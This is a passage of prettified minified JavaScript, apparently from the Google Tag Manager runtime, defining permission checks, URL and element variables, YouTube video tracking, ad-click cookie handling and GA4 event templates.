      (Z.__f.priorityOverride = 0),
      (Z.__f.isInfrastructure = !0),
      (Z.__f.runInSiloedMode = !1),
      (Z.securityGroups.access_globals = ["google"]),
      (function () {
        function a(b, c, d) {
          var e = { key: d, read: !1, write: !1, execute: !1 };
          switch (c) {
            case "read":
              e.read = !0;
              break;
            case "write":
              e.write = !0;
              break;
            case "readwrite":
              e.read = e.write = !0;
              break;
            case "execute":
              e.execute = !0;
              break;
            default:
              throw Error("Invalid " + b + " request " + c);
          }
          return e;
        }
        (Z.__access_globals = function (b) {
          for (
            var c = b.vtp_keys || [],
              d = b.vtp_createPermissionError,
              e = [],
              f = [],
              g = [],
              k = 0;
            k < c.length;
            k++
          ) {
            var m = c[k],
              n = m.key;
            m.read && e.push(n), m.write && f.push(n), m.execute && g.push(n);
          }
          return {
            assert: function (p, q, r) {
              if (!l(r)) throw d(p, {}, "Key must be a string.");
              if ("read" === q) {
                if (e.indexOf(r) > -1) return;
              } else if ("write" === q) {
                if (f.indexOf(r) > -1) return;
              } else if ("readwrite" === q) {
                if (f.indexOf(r) > -1 && e.indexOf(r) > -1) return;
              } else {
                if ("execute" !== q)
                  throw d(
                    p,
                    {},
                    "Operation must be either 'read', 'write', or 'execute', was " +
                      q
                  );
                if (g.indexOf(r) > -1) return;
              }
              throw d(
                p,
                {},
                "Prohibited " + q + " on global variable: " + r + "."
              );
            },
            N: a,
          };
        }),
          (Z.__access_globals.C = "access_globals"),
          (Z.__access_globals.isVendorTemplate = !0),
          (Z.__access_globals.priorityOverride = 0),
          (Z.__access_globals.isInfrastructure = !1),
          (Z.__access_globals.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.u = ["google"]),
      (a = function (b) {
        return {
          toString: function () {
            return b;
          },
        };
      }),
      (Z.__u = function (b) {
        var c;
        c =
          (c = b.vtp_customUrlSource
            ? b.vtp_customUrlSource
            : XI("gtm.url", 1)) || WI();
        var d = b[a("vtp_component")];
        if (!d || "URL" == d) return Vi(Yi(String(c)));
        var f,
          e = Yi(String(c));
        if ("QUERY" === d)
          a: {
            var n,
              g = b[a("vtp_multiQueryKeys").toString()],
              k = b[a("vtp_queryKey").toString()] || "",
              m = b[a("vtp_ignoreEmptyQueryParam").toString()];
            n = g
              ? Array.isArray(k)
                ? k
                : String(k).replace(/\s+/g, "").split(",")
              : [String(k)];
            for (var p = 0; p < n.length; p++) {
              var q = Si(e, "QUERY", void 0, void 0, n[p]);
              if (null != q && (!m || "" !== q)) {
                f = q;
                break a;
              }
            }
            f = void 0;
          }
        else
          f = Si(
            e,
            d,
            "HOST" == d ? b[a("vtp_stripWww")] : void 0,
            "PATH" == d ? b[a("vtp_defaultPages")] : void 0
          );
        return f;
      }),
      (Z.__u.C = "u"),
      (Z.__u.isVendorTemplate = !0),
      (Z.__u.priorityOverride = 0),
      (Z.__u.isInfrastructure = !0),
      (Z.__u.runInSiloedMode = !1),
      (Z.securityGroups.v = ["google"]),
      (Z.__v = function (a) {
        var b = a.vtp_name;
        if (!b || !b.replace) return !1;
        var c = XI(b.replace(/\\\./g, "."), a.vtp_dataLayerVersion || 1);
        return void 0 !== c ? c : a.vtp_defaultValue;
      }),
      (Z.__v.C = "v"),
      (Z.__v.isVendorTemplate = !0),
      (Z.__v.priorityOverride = 0),
      (Z.__v.isInfrastructure = !0),
      (Z.__v.runInSiloedMode = !1),
      (Z.securityGroups.ytl = ["google"]),
      (function () {
        function a() {
          var v = Math.round(1e9 * Math.random()) + "";
          return H.getElementById(v) ? a() : v;
        }
        function b(v, w) {
          if (!v) return !1;
          for (var x = 0; x < q.length; x++)
            if (v.indexOf("//" + q[x] + "/" + w) >= 0) return !0;
          return !1;
        }
        function c(v, w) {
          var x = v.getAttribute("src");
          if (b(x, "embed/")) {
            if (x.indexOf("enablejsapi=1") > 0) return !0;
            if (w) {
              var B,
                y = v.setAttribute,
                A = -1 !== x.indexOf("?") ? "&" : "?";
              if (x.indexOf("origin=") > -1) B = x + A + "enablejsapi=1";
              else {
                if (!t) {
                  var C = ZI("document");
                  (t = C.location.protocol + "//" + C.location.hostname),
                    C.location.port && (t += ":" + C.location.port);
                }
                B = x + A + "enablejsapi=1&origin=" + encodeURIComponent(t);
              }
              return y.call(v, "src", B), !0;
            }
          }
          return !1;
        }
        function d(v, w) {
          if (
            !v.getAttribute("data-gtm-yt-inspected-" + w.Db) &&
            (v.setAttribute("data-gtm-yt-inspected-" + w.Db, "true"),
            c(v, w.Fe))
          ) {
            v.id || (v.id = a());
            var x = ZI("YT"),
              y = x.get(v.id);
            y || (y = new x.Player(v.id));
            var C,
              B = (function f(v, w) {
                var x, y;
                function B() {
                  return (
                    (V = (function (a, b, c) {
                      function d() {
                        var g = a();
                        (f += e ? ((Cb() - e) * g.playbackRate) / 1e3 : 0),
                          (e = Cb());
                      }
                      var e = 0,
                        f = 0;
                      return {
                        createEvent: function (g, k, m) {
                          var n = a(),
                            p = n.lh,
                            q = m
                              ? Math.round(m)
                              : k
                              ? Math.round(n.lh * k)
                              : Math.round(n.Oj),
                            r =
                              void 0 !== k
                                ? Math.round(100 * k)
                                : p <= 0
                                ? 0
                                : Math.round((q / p) * 100),
                            t = !H.hidden && bs(c) >= 0.5;
                          d();
                          var u = void 0;
                          void 0 !== b && (u = [b]);
                          var v = Fz(c, "gtm.video", u);
                          return (
                            (v["gtm.videoProvider"] = "youtube"),
                            (v["gtm.videoStatus"] = g),
                            (v["gtm.videoUrl"] = n.url),
                            (v["gtm.videoTitle"] = n.title),
                            (v["gtm.videoDuration"] = Math.round(p)),
                            (v["gtm.videoCurrentTime"] = Math.round(q)),
                            (v["gtm.videoElapsedTime"] = Math.round(f)),
                            (v["gtm.videoPercent"] = r),
                            (v["gtm.videoVisible"] = t),
                            v
                          );
                        },
                        jk: function () {
                          e = Cb();
                        },
                        pd: function () {
                          d();
                        },
                      };
                    })(
                      function () {
                        return {
                          url: S,
                          title: na,
                          lh: X,
                          Oj: v.getCurrentTime(),
                          playbackRate: la,
                        };
                      },
                      w.Db,
                      v.getIframe()
                    )),
                    (X = 0),
                    (na = S = ""),
                    (la = 1),
                    A
                  );
                }
                function A(Ga) {
                  if (Ga === r.PLAYING) {
                    if (
                      ((X = Math.round(v.getDuration())),
                      (S = v.getVideoUrl()),
                      v.getVideoData)
                    ) {
                      var Sa = v.getVideoData();
                      na = Sa ? Sa.title : "";
                    }
                    return (
                      (la = v.getPlaybackRate()),
                      w.eh ? ny(V.createEvent("start")) : V.pd(),
                      (aa = (function m(v, w, x) {
                        var y = v.map(function (C) {
                          return { Fa: C, We: C, Te: void 0 };
                        });
                        if (!w.length) return y;
                        var B = w.map(function (C) {
                          return { Fa: C * x, We: void 0, Te: C };
                        });
                        if (!y.length) return B;
                        var A = y.concat(B);
                        return (
                          A.sort(function (C, E) {
                            return C.Fa - E.Fa;
                          }),
                          A
                        );
                      })(w.Rh, w.Qh, v.getDuration())),
                      C(Ga)
                    );
                  }
                  return A;
                }
                function C() {
                  return (
                    (ha = v.getCurrentTime()),
                    (ya = new Date().getTime()),
                    V.jk(),
                    R(),
                    E
                  );
                }
                function E(Ga) {
                  var Sa;
                  switch (Ga) {
                    case r.ENDED:
                      return F(Ga);
                    case r.PAUSED:
                      Sa = "pause";
                    case r.BUFFERING:
                      var cb = v.getCurrentTime() - ha;
                      return (
                        (Sa =
                          Math.abs(
                            ((new Date().getTime() - ya) / 1e3) * la - cb
                          ) > 1
                            ? "seek"
                            : Sa || "buffering"),
                        v.getCurrentTime() &&
                          (w.bh ? ny(V.createEvent(Sa)) : V.pd()),
                        M(),
                        D
                      );
                    case r.UNSTARTED:
                      return B(Ga);
                    default:
                      return E;
                  }
                }
                function D(Ga) {
                  switch (Ga) {
                    case r.ENDED:
                      return F(Ga);
                    case r.PLAYING:
                      return C(Ga);
                    case r.UNSTARTED:
                      return B(Ga);
                    default:
                      return D;
                  }
                }
                function F() {
                  for (; y; ) {
                    var Ga = x;
                    TI(y), Ga();
                  }
                  return (
                    w.ah && ny(V.createEvent("complete", 1)), B(r.UNSTARTED)
                  );
                }
                function L() {}
                function M() {
                  y && (TI(y), (y = 0), (x = L));
                }
                function R() {
                  if (aa.length && 0 !== la) {
                    var Sa,
                      Ga = -1;
                    do {
                      if ((Sa = aa[0]).Fa > v.getDuration()) return;
                      if (
                        (Ga = (Sa.Fa - v.getCurrentTime()) / la) < 0 &&
                        (aa.shift(), 0 === aa.length)
                      )
                        return;
                    } while (Ga < 0);
                    (x = function () {
                      (y = 0),
                        (x = L),
                        aa.length > 0 &&
                          aa[0].Fa === Sa.Fa &&
                          (aa.shift(),
                          ny(V.createEvent("progress", Sa.Te, Sa.We))),
                        R();
                    }),
                      (y = UI(x, 1e3 * Ga));
                  }
                }
                var V,
                  X,
                  S,
                  na,
                  la,
                  ha,
                  ya,
                  aa = [],
                  Na = B(r.UNSTARTED);
                return (
                  (y = 0),
                  (x = L),
                  {
                    onStateChange: function (Ga) {
                      Na = Na(Ga);
                    },
                    onPlaybackRateChange: function (Ga) {
                      (ha = v.getCurrentTime()),
                        (ya = new Date().getTime()),
                        V.pd(),
                        (la = Ga),
                        M(),
                        R();
                    },
                  }
                );
              })(y, w),
              A = {};
            for (C in B)
              ((A = { Oe: A.Oe }).Oe = C),
                B.hasOwnProperty(A.Oe) &&
                  y.addEventListener(
                    A.Oe,
                    (function (E) {
                      return function (D) {
                        return B[E.Oe](D.data);
                      };
                    })(A)
                  );
          }
        }
        function p(v) {
          var w = !!v.vtp_captureStart,
            x = !!v.vtp_captureComplete,
            y = !!v.vtp_capturePause,
            B = (function g(v) {
              for (
                var w = v.split(","), x = w.length, y = [], B = 0;
                B < x;
                B++
              ) {
                var A = parseInt(w[B], 10);
                isNaN(A) || A > 100 || A < 0 || y.push(A / 100);
              }
              return (
                y.sort(function (C, E) {
                  return C - E;
                }),
                y
              );
            })(v.vtp_progressThresholdsPercent + ""),
            A = (function k(v) {
              for (
                var w = v.split(","), x = w.length, y = [], B = 0;
                B < x;
                B++
              ) {
                var A = parseInt(w[B], 10);
                isNaN(A) || A < 0 || y.push(A);
              }
              return (
                y.sort(function (C, E) {
                  return C - E;
                }),
                y
              );
            })(v.vtp_progressThresholdsTimeInSeconds + ""),
            C = !!v.vtp_fixMissingApi;
          if (w || x || y || B.length || A.length) {
            var E = {
                eh: w,
                ah: x,
                bh: y,
                Qh: B,
                Rh: A,
                Fe: C,
                Db:
                  void 0 === v.vtp_uniqueTriggerId ? "" : v.vtp_uniqueTriggerId,
              },
              D = ZI("YT"),
              F = function () {
                !(function e(v) {
                  I(function () {
                    function w() {
                      for (
                        var y = x.getElementsByTagName("iframe"),
                          B = y.length,
                          A = 0;
                        A < B;
                        A++
                      )
                        d(y[A], v);
                    }
                    var x = ZI("document");
                    w(), oB(w);
                  });
                })(E);
              };
            if ((I(v.vtp_gtmOnSuccess), D)) D.ready && D.ready(F);
            else {
              var L = ZI("onYouTubeIframeAPIReady");
              !(function (a, b) {
                G[a] = b;
              })("onYouTubeIframeAPIReady", function () {
                L && L(), F();
              }),
                I(function () {
                  for (
                    var M = ZI("document"),
                      R = M.getElementsByTagName("script"),
                      V = R.length,
                      aa = 0;
                    aa < V;
                    aa++
                  ) {
                    var X = R[aa].getAttribute("src");
                    if (b(X, "iframe_api") || b(X, "player_api")) return;
                  }
                  for (
                    var S = M.getElementsByTagName("iframe"),
                      na = S.length,
                      la = 0;
                    la < na;
                    la++
                  )
                    if (!u && c(S[la], E.Fe)) {
                      VI("https://www.youtube.com/iframe_api"), (u = !0);
                      break;
                    }
                });
            }
          } else I(v.vtp_gtmOnSuccess);
        }
        var t,
          q = ["www.youtube.com", "www.youtube-nocookie.com"],
          r = {
            UNSTARTED: -1,
            ENDED: 0,
            PLAYING: 1,
            PAUSED: 2,
            BUFFERING: 3,
            CUED: 5,
          },
          u = !1;
        (Z.__ytl = function n(v) {
          v.vtp_triggerStartOption
            ? p(v)
            : sw(function () {
                p(v);
              });
        }),
          (Z.__ytl.C = "ytl"),
          (Z.__ytl.isVendorTemplate = !0),
          (Z.__ytl.priorityOverride = 0),
          (Z.__ytl.isInfrastructure = !1),
          (Z.__ytl.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.read_event_data = ["google"]),
      (function () {
        function a(b, c) {
          return { key: c };
        }
        (Z.__read_event_data = function (b) {
          var c = b.vtp_eventDataAccess,
            d = b.vtp_keyPatterns || [],
            e = b.vtp_createPermissionError;
          return {
            assert: function (f, g) {
              if (null != g && !l(g))
                throw e(f, { key: g }, "Key must be a string.");
              if ("any" !== c) {
                try {
                  if ("specific" === c && null != g && kg(g, d)) return;
                } catch (k) {
                  throw e(f, { key: g }, "Invalid key filter.");
                }
                throw e(f, { key: g }, "Prohibited read from event data.");
              }
            },
            N: a,
          };
        }),
          (Z.__read_event_data.C = "read_event_data"),
          (Z.__read_event_data.isVendorTemplate = !0),
          (Z.__read_event_data.priorityOverride = 0),
          (Z.__read_event_data.isInfrastructure = !1),
          (Z.__read_event_data.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.gclidw = ["google"]),
      (function () {
        var a = ["aw", "dc", "gf", "ha", "gb"];
        (Z.__gclidw = function (b) {
          var c, d, e, f;
          b.vtp_enableCookieOverrides &&
            ((e = b.vtp_cookiePrefix),
            (c = b.vtp_path),
            (d = b.vtp_domain),
            (f = b.vtp_cookieFlags));
          var g = XI(P.g.fa);
          if (((g = null != g && !1 !== g), U(18))) {
            var k = {},
              m =
                ((k[P.g.Pa] = e),
                (k[P.g.Hb] = c),
                (k[P.g.Wa] = d),
                (k[P.g.ab] = f),
                (k[P.g.fa] = g),
                k);
            if (
              (b.vtp_enableUrlPassthrough && (m[P.g.Xa] = !0),
              b.vtp_enableCrossDomain && b.vtp_linkerDomains)
            ) {
              var n = {};
              m[P.g.sa] =
                ((n[P.g.Cc] = b.vtp_acceptIncoming),
                (n[P.g.W] = b.vtp_linkerDomains
                  .toString()
                  .replace(/\s+/g, "")
                  .split(",")),
                (n[P.g.Lb] = b.vtp_urlPosition),
                (n[P.g.vb] = b.vtp_formDecoration),
                n);
            }
            var p = Xl(
              Wl(
                Vl(
                  Ul(
                    Nl(new Ml(b.vtp_gtmEventId, b.vtp_gtmPriorityId), m),
                    b.vtp_gtmOnSuccess
                  ),
                  b.vtp_gtmOnFailure
                ),
                !0
              )
            );
            (p.eventMetadata.hit_type_override = "page_view"),
              (function (a, b, c, d) {
                function e(t, u) {
                  for (var v = ma(k), w = v.next(); !w.done; w = v.next()) {
                    var x = w.value;
                    (x.isAborted = !1),
                      (x.metadata.speculative = !0),
                      (x.metadata.consent_updated = !0),
                      (x.metadata.event_start_timestamp_ms = Cb()),
                      (x.metadata.consent_event_id = t),
                      (x.metadata.consent_priority_id = u);
                  }
                }
                function f(t) {
                  for (var u = {}, v = 0; v < k.length; u = { Sa: void 0 }, v++)
                    (u.Sa = k[v]),
                      (!t || t(u.Sa.metadata.hit_type)) &&
                        ((u.Sa.metadata.consent_updated &&
                          "page_view" !== u.Sa.metadata.hit_type &&
                          !W(q)) ||
                          (KC(k[v]),
                          u.Sa.metadata.speculative ||
                            u.Sa.isAborted ||
                            (Sv(u.Sa),
                            "page_view" === u.Sa.metadata.hit_type &&
                              U(22) &&
                              void 0 === u.Sa.o[P.g.uf] &&
                              void 0 === r &&
                              (r = ko(
                                eo.ue,
                                (function (w) {
                                  return function () {
                                    W(P.g.O) &&
                                      ((w.Sa.metadata.user_id_updated = !0),
                                      (w.Sa.metadata.consent_updated = !1),
                                      (w.Sa.o[P.g.Sb] = void 0),
                                      f(function (x) {
                                        return "page_view" === x;
                                      }),
                                      (w.Sa.metadata.user_id_updated = !1),
                                      lo(eo.ue, r),
                                      (r = void 0));
                                  };
                                })(u)
                              )))));
                }
                var g =
                  d.isGtmEvent && "" === a
                    ? { id: "", prefix: "", ia: "", ma: [] }
                    : pl(a, d.isGtmEvent);
                if (g) {
                  var k = [];
                  if (d.eventMetadata.hit_type_override) {
                    var m = d.eventMetadata.hit_type_override;
                    Array.isArray(m) || (m = [m]);
                    for (var n = 0; n < m.length; n++) {
                      var p = LC(m[n], g, b, d);
                      (p.metadata.speculative = !1), k.push(p);
                    }
                  } else
                    b === P.g.ba &&
                      (U(18)
                        ? k.push(LC("page_view", g, b, d))
                        : k.push(LC("landing_page", g, b, d))),
                      k.push(LC("conversion", g, b, d)),
                      k.push(LC("user_data_lead", g, b, d)),
                      k.push(LC("user_data_web", g, b, d)),
                      k.push(LC("remarketing", g, b, d));
                  var q = [P.g.R, P.g.O],
                    r = void 0;
                  il(function () {
                    f(),
                      U(23) &&
                        (W([P.g.ya]) ||
                          hl(
                            function (t) {
                              e(t.consentEventId, t.consentPriorityId),
                                f(function (u) {
                                  return "remarketing" === u;
                                });
                            },
                            [P.g.ya]
                          )),
                      W(q) ||
                        hl(function (t) {
                          e(t.consentEventId, t.consentPriorityId), f();
                        }, q);
                  }, q);
                }
              })("", P.g.ba, Date.now(), p);
          } else {
            I(b.vtp_gtmOnSuccess);
            var q = { prefix: e, path: c, domain: d, flags: f };
            if (
              ((b.vtp_enableCrossDomain && !1 === b.vtp_acceptIncoming) ||
                ((b.vtp_enableCrossDomain || gp()) && (iq(a, q), tp(q))),
              fq(q),
              oq(["aw", "dc"], q),
              Nq(q, void 0, void 0, g),
              b.vtp_enableCrossDomain && b.vtp_linkerDomains)
            ) {
              var r = b.vtp_linkerDomains
                .toString()
                .replace(/\s+/g, "")
                .split(",");
              mq(a, r, b.vtp_urlPosition, !!b.vtp_formDecoration, q.prefix),
                up(
                  mp(q.prefix),
                  r,
                  b.vtp_urlPosition,
                  !!b.vtp_formDecoration,
                  q
                ),
                up("FPAU", r, b.vtp_urlPosition, !!b.vtp_formDecoration, q);
            }
            !zi.D && !oi && U(81) && pt(void 0, Math.round(Cb())),
              Ar({
                m: Xl(new Ml(b.vtp_gtmEventId, b.vtp_gtmPriorityId)),
                hh: !1,
                zd: g,
                jc: q,
                Pf: !0,
              }),
              (Mk = !0),
              b.vtp_enableUrlPassthrough && rq(["aw", "dc", "gb"]),
              tq(["aw", "dc", "gb"]);
          }
        }),
          (Z.__gclidw.C = "gclidw"),
          (Z.__gclidw.isVendorTemplate = !0),
          (Z.__gclidw.priorityOverride = 100),
          (Z.__gclidw.isInfrastructure = !1),
          (Z.__gclidw.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.process_dom_events = ["google"]),
      (function () {
        function a(b, c, d) {
          return { targetType: c, eventName: d };
        }
        (Z.__process_dom_events = function (b) {
          for (
            var c = b.vtp_targets || [],
              d = b.vtp_createPermissionError,
              e = {},
              f = 0;
            f < c.length;
            f++
          ) {
            var g = c[f];
            (e[g.targetType] = e[g.targetType] || []),
              e[g.targetType].push(g.eventName);
          }
          return {
            assert: function (k, m, n) {
              if (!e[m]) throw d(k, {}, "Prohibited event target " + m + ".");
              if (-1 === e[m].indexOf(n))
                throw d(
                  k,
                  {},
                  "Prohibited listener registration for DOM event " + n + "."
                );
            },
            N: a,
          };
        }),
          (Z.__process_dom_events.C = "process_dom_events"),
          (Z.__process_dom_events.isVendorTemplate = !0),
          (Z.__process_dom_events.priorityOverride = 0),
          (Z.__process_dom_events.isInfrastructure = !1),
          (Z.__process_dom_events.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.aev = ["google"]),
      (function () {
        function a(r, t, u, v, w) {
          w || (w = "element");
          var y,
            x = t + "." + u;
          if (n.hasOwnProperty(x)) y = n[x];
          else {
            var B = r[w];
            if (B && ((y = v(B)), (n[x] = y), p.push(x), p.length > 35)) {
              var A = p.shift();
              delete n[A];
            }
          }
          return y;
        }
        function b(r, t, u) {
          var v = r[q[t]];
          return void 0 !== v ? v : u;
        }
        function c(r, t) {
          if (!r) return !1;
          var u = d(WI());
          Array.isArray(t) ||
            (t = String(t || "")
              .replace(/\s+/g, "")
              .split(","));
          for (var v = [u], w = 0; w < t.length; w++) {
            var x = t[w];
            if (x.hasOwnProperty("is_regex"))
              if (x.is_regex)
                try {
                  x = new RegExp(x.domain);
                } catch (A) {
                  continue;
                }
              else x = x.domain;
            var y = d(r);
            if (x instanceof RegExp) {
              if (x.test(y)) return !1;
            } else {
              var B = x;
              if (0 != B.length) {
                if (y.indexOf(B) >= 0) return !1;
                v.push(d(B));
              }
            }
          }
          return !(function (a, b) {
            if (!a) return !1;
            var c = Si(Yi(a), "host");
            if (!c) return !1;
            for (var d = 0; b && d < b.length; d++) {
              var e = b[d] && b[d].toLowerCase();
              if (e) {
                var f = c.length - e.length;
                if (
                  (f > 0 && "." != e.charAt(0) && (f--, (e = "." + e)),
                  f >= 0 && c.indexOf(e, f) == f)
                )
                  return !0;
              }
            }
            return !1;
          })(r, v);
        }
        function d(r) {
          return m.test(r) || (r = "http://" + r), Si(Yi(r), "HOST", !0);
        }
        function f(r) {
          switch (r.tagName.toLowerCase()) {
            case "input":
              return Gc(r, "value");
            case "button":
              return Hc(r);
            default:
              return null;
          }
        }
        function g(r) {
          if ("form" === r.tagName.toLowerCase() && r.elements) {
            for (var t = 0, u = 0; u < r.elements.length; u++)
              Gz(r.elements[u]) && t++;
            return t;
          }
        }
        function k(r, t, u) {
          var v = r.interactedFormField;
          return (v && Gc(v, t)) || u;
        }
        var m = /^https?:\/\//i,
          n = {},
          p = [],
          q = {
            ATTRIBUTE: "elementAttribute",
            CLASSES: "elementClasses",
            ELEMENT: "element",
            ID: "elementId",
            HISTORY_CHANGE_SOURCE: "historyChangeSource",
            HISTORY_NEW_STATE: "newHistoryState",
            HISTORY_NEW_URL_FRAGMENT: "newUrlFragment",
            HISTORY_OLD_STATE: "oldHistoryState",
            HISTORY_OLD_URL_FRAGMENT: "oldUrlFragment",
            TARGET: "elementTarget",
          };
        (Z.__aev = function (r) {
          var t = r.vtp_gtmEventId,
            u = r.vtp_defaultValue,
            v = r.vtp_varType,
            w = r.vtp_gtmCachedValues.gtm;
          switch (v) {
            case "TAG_NAME":
              var x = w.element;
              return (x && x.tagName) || u;
            case "TEXT":
              return a(w, t, v, Hc) || u;
            case "URL":
              var y;
              a: {
                var B = String(w.elementUrl || u || ""),
                  A = Yi(B),
                  C = String(r.vtp_component || "URL");
                switch (C) {
                  case "URL":
                    y = B;
                    break a;
                  case "IS_OUTBOUND":
                    y = c(B, r.vtp_affiliatedDomains);
                    break a;
                  default:
                    y = Si(
                      A,
                      C,
                      r.vtp_stripWww,
                      r.vtp_defaultPages,
                      r.vtp_queryKey
                    );
                }
              }
              return y;
            case "ATTRIBUTE":
              var E;
              if (void 0 === r.vtp_attribute) E = b(w, v, u);
              else {
                var D = w.element;
                E = (D && Gc(D, r.vtp_attribute)) || u || "";
              }
              return E;
            case "MD":
              var F = r.vtp_mdValue,
                L = a(w, t, "MD", OI);
              return F && L ? LI(L, F) || u : L || u;
            case "FORM":
              return (function e(r, t, u, v) {
                switch (r) {
                  case "SUBMIT_TEXT":
                    return a(t, u, "FORM." + r, f, "formSubmitElement") || v;
                  case "LENGTH":
                    var w = a(t, u, "FORM." + r, g);
                    return void 0 === w ? v : w;
                  case "INTERACTED_FIELD_ID":
                    return k(t, "id", v);
                  case "INTERACTED_FIELD_NAME":
                    return k(t, "name", v);
                  case "INTERACTED_FIELD_TYPE":
                    return k(t, "type", v);
                  case "INTERACTED_FIELD_POSITION":
                    var x = t.interactedFormFieldPosition;
                    return void 0 === x ? v : x;
                  case "INTERACT_SEQUENCE_NUMBER":
                    var y = t.interactSequenceNumber;
                    return void 0 === y ? v : y;
                  default:
                    return v;
                }
              })(String(r.vtp_component || "SUBMIT_TEXT"), w, t, u);
            default:
              return b(w, v, u);
          }
        }),
          (Z.__aev.C = "aev"),
          (Z.__aev.isVendorTemplate = !0),
          (Z.__aev.priorityOverride = 0),
          (Z.__aev.isInfrastructure = !0),
          (Z.__aev.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.detect_element_visibility_events = ["google"]),
      (function () {
        function a() {
          return {};
        }
        (Z.__detect_element_visibility_events = function () {
          return { assert: function () {}, N: a };
        }),
          (Z.__detect_element_visibility_events.C =
            "detect_element_visibility_events"),
          (Z.__detect_element_visibility_events.isVendorTemplate = !0),
          (Z.__detect_element_visibility_events.priorityOverride = 0),
          (Z.__detect_element_visibility_events.isInfrastructure = !1),
          (Z.__detect_element_visibility_events.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.gaawe = ["google"]),
      (function () {
        function a(f, g, k) {
          for (var m = 0; m < g.length; m++)
            f.hasOwnProperty(g[m]) && (f[g[m]] = k(f[g[m]]));
        }
        var c = [],
          d = {
            id: "transaction_id",
            revenue: "value",
            list: "item_list_name",
          },
          e = {
            click: "select_item",
            detail: "view_item",
            add: "add_to_cart",
            remove: "remove_from_cart",
            checkout: "begin_checkout",
            checkout_option: "checkout_option",
            purchase: "purchase",
            refund: "refund",
          };
        (Z.__gaawe = function (f) {
          var g;
          if (
            l(
              (g = f.vtp_migratedToV2
                ? String(f.vtp_measurementIdOverride)
                : String(f.vtp_measurementIdOverride || f.vtp_measurementId))
            ) &&
            0 === g.indexOf("G-")
          ) {
            var k = String(f.vtp_eventName),
              m = {};
            (c = []),
              f.vtp_sendEcommerceData &&
                (Wh.hasOwnProperty(k) || "checkout_option" === k) &&
                (function b(f, g, k) {
                  var q,
                    m = {},
                    n = function (u, v) {
                      m[u] = m[u] || v;
                    },
                    p = function (u, v, w) {
                      if (((w = void 0 !== w && w), c.push(6), u)) {
                        m.items = m.items || [];
                        for (
                          var x = {}, y = 0;
                          y < u.length;
                          x = { Re: void 0 }, y++
                        )
                          (x.Re = {}),
                            z(
                              u[y],
                              (function (A) {
                                return function (C, E) {
                                  w && "id" === C
                                    ? (A.Re.promotion_id = E)
                                    : w && "name" === C
                                    ? (A.Re.promotion_name = E)
                                    : (A.Re[C] = E);
                                };
                              })(x)
                            ),
                            m.items.push(x.Re);
                      }
                      if (v)
                        for (var B in v)
                          d.hasOwnProperty(B) ? n(d[B], v[B]) : n(B, v[B]);
                    };
                  if (
                    ("dataLayer" === f.vtp_getEcommerceDataFrom
                      ? (q = f.vtp_gtmCachedValues.eventModel) ||
                        (q = f.vtp_gtmCachedValues.ecommerce)
                      : ((q = f.vtp_ecommerceMacroData),
                        Ta(q) && q.ecommerce && !q.items && (q = q.ecommerce)),
                    Ta(q))
                  ) {
                    var t,
                      r = !1;
                    for (t in q)
                      q.hasOwnProperty(t) &&
                        (r || (c.push(5), (r = !0)),
                        "currencyCode" === t
                          ? n("currency", q.currencyCode)
                          : "impressions" === t && g === P.g.kb
                          ? p(q.impressions, null)
                          : "promoClick" === t && g === P.g.Fb
                          ? p(
                              q.promoClick.promotions,
                              q.promoClick.actionField,
                              !0
                            )
                          : "promoView" === t && g === P.g.lb
                          ? p(
                              q.promoView.promotions,
                              q.promoView.actionField,
                              !0
                            )
                          : e.hasOwnProperty(t)
                          ? g === e[t] && p(q[t].products, q[t].actionField)
                          : (m[t] = q[t]));
                    h(m, k);
                  }
                })(f, k, m);
            var n = f.vtp_eventSettingsVariable;
            if (n) for (var p in n) n.hasOwnProperty(p) && (m[p] = n[p]);
            if (f.vtp_eventSettingsTable) {
              var r,
                q = KI(f.vtp_eventSettingsTable, "parameter", "parameterValue");
              for (r in q) m[r] = q[r];
            }
            var u,
              t = KI(f.vtp_eventParameters, "name", "value");
            for (u in t) t.hasOwnProperty(u) && (m[u] = t[u]);
            var v = f.vtp_userDataVariable;
            if (
              (v && (m[P.g.Ea] = v),
              m.hasOwnProperty(P.g.eb) || f.vtp_userProperties)
            ) {
              var w = m[P.g.eb] || {};
              h(KI(f.vtp_userProperties, "name", "value"), w), (m[P.g.eb] = w);
            }
            var x = {
              originatingEntity: uw(
                1,
                f.vtp_gtmEntityIndex,
                f.vtp_gtmEntityName
              ),
            };
            if (c.length > 0) {
              var y = {};
              x.eventMetadata = ((y.event_usage = c), y);
            }
            a(m, Xh, function (A) {
              return yb(A);
            }),
              a(m, Zh, function (A) {
                return Number(A);
              });
            var B = f.vtp_gtmEventId;
            (x.noGtmEvent = !0),
              Fx(
                (function Dx(a, b, c) {
                  return ((c = c || {})[P.g.ac] = a), wx("event", b, c);
                })(g, k, m),
                B,
                x
              ),
              I(f.vtp_gtmOnSuccess);
          } else I(f.vtp_gtmOnFailure);
        }),
          (Z.__gaawe.C = "gaawe"),
          (Z.__gaawe.isVendorTemplate = !0),
          (Z.__gaawe.priorityOverride = 0),
          (Z.__gaawe.isInfrastructure = !1),
          (Z.__gaawe.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.detect_link_click_events = ["google"]),
      (function () {
        function a(b, c) {
          return { options: c };
        }
        (Z.__detect_link_click_events = function (b) {
          var c = b.vtp_allowWaitForTags,
            d = b.vtp_createPermissionError;
          return {
            assert: function (e, f) {
              if (!c && f && f.waitForTags)
                throw d(e, {}, "Prohibited option waitForTags.");
            },
            N: a,
          };
        }),
          (Z.__detect_link_click_events.C = "detect_link_click_events"),
          (Z.__detect_link_click_events.isVendorTemplate = !0),
          (Z.__detect_link_click_events.priorityOverride = 0),
          (Z.__detect_link_click_events.isInfrastructure = !1),
          (Z.__detect_link_click_events.runInSiloedMode = !1);
      })(),
      (Z.securityGroups.detect_form_submit_events = ["google"]),
      (function () {
        function a(b, c) {
          return { options: c };
        }
        (Z.__detect_form_submit_events = function (b) {
          var c = b.vtp_allowWaitForTags,
            d = b.vtp_createPermissionError;
          return {
            assert: function (e, f) {
              if (!c && f && f.waitForTags)
                throw d(e, {}, "Prohibited option waitForTags.");
            },
            N: a,
          };
        }),
          (Z.__detect_form_submit_events.C = "detect_form_submit_events"),
          (Z.__detect_form_submit_events.isVendorTemplate = !0),
          (Z.__detect_form_submit_events.priorityOverride = 0),
